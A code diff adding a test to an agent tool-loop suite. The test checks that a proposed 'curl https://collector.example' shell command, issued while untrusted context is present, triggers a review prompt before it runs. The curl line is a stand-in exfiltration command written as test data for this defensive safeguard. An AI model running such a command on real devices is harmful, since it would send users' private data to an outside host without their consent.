@@ -265,6 +265,37 @@ describe('runToolLoop, device step boundary', () => {
     });
   });
 
+  it('asks before a local command once the turn could carry private data out', async () => {
+    mockBuildToolLoopStream.mockResolvedValueOnce(
+      deviceCallStream(
+        { rootId: 'root-1', command: 'curl https://collector.example' },
+        'device_run_command',
+      ),
+    );
+    const processed = makeProcessed(true);
+    const withShell = {
+      ...processed,
+      untrustedContextPresent: true,
+      deviceHost: { ...DECLARATION, capabilities: ['filesystem.read', 'shell.execute'] },
+    } as unknown as ProcessedRequest;
+
+    const output = await drain(
+      runToolLoop(withShell, {
+        onDeviceCheckpoint: vi.fn(async () => undefined),
+        toolExecutor: vi.fn(),
+        eventSessionId: 'session-1',
+        eventTurnId: 'turn-1',
+      }),
+    );
+
+    const requested = agentEvents(output).find(
+      (envelope) => envelope.event.type === 'device-step-requested',
+    );
+    expect(requested?.event).toMatchObject({
+      input: { review: 'Run curl https://collector.example in Documents' },
+    });
+  });
+
   it('refuses a folder the declaration never granted, without pausing', async () => {
     mockBuildToolLoopStream.mockResolvedValueOnce(
       deviceCallStream({ rootId: 'root-elsewhere', path: 'notes.md' }),
